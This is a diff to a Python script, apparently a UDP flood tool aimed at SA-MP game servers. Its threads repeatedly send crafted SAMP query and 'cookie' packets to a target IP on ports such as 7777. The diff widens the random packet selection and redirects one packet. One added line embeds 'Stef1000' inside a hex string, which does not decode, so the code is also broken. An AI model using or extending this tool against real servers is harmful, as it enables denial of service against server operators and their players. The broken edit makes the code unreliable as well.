@@ -18,7 +18,7 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                        codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                        codecs.decode("081e6900da","hex_codec"), #cookie port 7796
-                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
+                       codecs.decode("081e77daStef1000","hex_codec"),#cookie port 7777
                        codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                        codecs.decode("021efd40","hex_codec"),#cookie port 7784
                        codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
@@ -39,13 +39,13 @@ class MyThread(threading.Thread):
                 sock = socket.socket(
                     socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                 
-                msg = Pacotes[random.randrange(0,3)]
+                msg = Pacotes[random.randrange(0,10)]
                      
                 sock.sendto(msg, (ip, int(port)))
                 
                 
                 if(int(port) == 7777):
-                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[9], (ip, int(port)))
                 elif(int(port) == 7796):
                     sock.sendto(Pacotes[4], (ip, int(port)))
                 elif(int(port) == 7771):
